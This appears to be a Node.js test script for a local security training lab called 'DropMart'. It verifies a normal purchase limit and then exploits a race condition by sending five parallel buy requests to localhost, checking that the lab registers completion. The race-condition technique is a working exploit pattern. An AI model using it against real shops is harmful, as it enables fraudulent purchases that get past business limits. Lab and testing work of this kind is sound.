const http = require('http');

function makeRequest(options) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          data: data
        });
      });
    });

    req.on('error', (e) => reject(e));
    req.end();
  });
}

function extractCookie(headers) {
  const setCookie = headers['set-cookie'];
  if (!setCookie) return null;
  return setCookie[0].split(';')[0];
}

async function runTest() {
  console.log('--- Testing DropMart Lab ---');
  let sessionCookie = null;

  try {
    // 1. Initial Request to get session cookie
    console.log('[*] Accessing dropmart homepage...');
    let res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/dropmart/',
      method: 'GET'
    });
    sessionCookie = extractCookie(res.headers);
    console.log(`[+] Session Cookie: ${sessionCookie}`);

    // Reset stock first just in case
    await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/dropmart/reset',
      method: 'POST',
      headers: {
        'Cookie': sessionCookie
      }
    });
    console.log(`[+] Lab reset`);

    // 2. Normal Workflow: Try to buy one item
    console.log('[*] Normal Workflow: Buying one item...');
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/dropmart/buy',
      method: 'POST',
      headers: {
        'Cookie': sessionCookie
      }
    });
    console.log(`[+] Normal Buy Status: ${res.statusCode}`);

    // Check if second normal buy fails
    console.log('[*] Normal Workflow: Attempting to buy a second item (should fail)...');
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/dropmart/buy',
      method: 'POST',
      headers: {
        'Cookie': sessionCookie
      }
    });
    console.log(`[+] Second Normal Buy Status: ${res.statusCode}`);
    
    // Reset lab for race condition test
    await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/dropmart/reset',
      method: 'POST',
      headers: {
        'Cookie': sessionCookie
      }
    });
    console.log(`[+] Lab reset for race condition test`);

    // 3. Manipulated Workflow: Race Condition
    console.log('[*] Manipulated Workflow: Triggering Race Condition with 5 parallel requests...');
    
    const reqOptions = {
      hostname: 'localhost',
      port: 3000,
      path: '/labs/dropmart/buy',
      method: 'POST',
      headers: {
        'Cookie': sessionCookie
      }
    };

    const promises = [];
    for (let i = 0; i < 5; i++) {
      promises.push(makeRequest(reqOptions));
    }
    
    const results = await Promise.all(promises);
    console.log(`[+] Sent 5 parallel requests.`);
    results.forEach((r, i) => {
      console.log(`    Request ${i+1} status: ${r.statusCode}`);
    });

    // 4. Verify Lab Completion
    console.log('[*] Verifying Lab Completion...');
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/dropmart/',
      method: 'GET',
      headers: {
        'Cookie': sessionCookie
      }
    });

    if (res.data.includes('Lab Completed!') || res.data.includes('System Override Detected')) {
      console.log('[+] SUCCESS: Lab completion verified!');
    } else {
      console.log('[-] FAILURE: Lab did not complete.');
      process.exit(1);
    }

  } catch (err) {
    console.error('Error during test:', err.message);
  }
}

runTest();
